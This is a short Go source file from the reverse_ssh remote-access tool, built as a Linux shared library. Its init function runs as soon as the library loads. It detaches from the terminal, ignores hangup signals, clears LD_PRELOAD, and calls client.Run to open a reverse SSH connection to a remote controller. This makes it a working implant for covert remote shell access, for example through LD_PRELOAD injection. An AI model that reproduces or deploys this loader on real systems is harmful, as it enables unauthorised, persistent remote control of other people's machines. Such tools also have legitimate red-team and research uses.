//go:build linux && cgo && cshared

package main

import (
	"os"
	"os/signal"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func init() {
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP)
	//If we're loading as a shared lib, stop our children from being polluted
	os.Setenv("LD_PRELOAD", "")

	client.Run(destination, fingerprint, "")
}
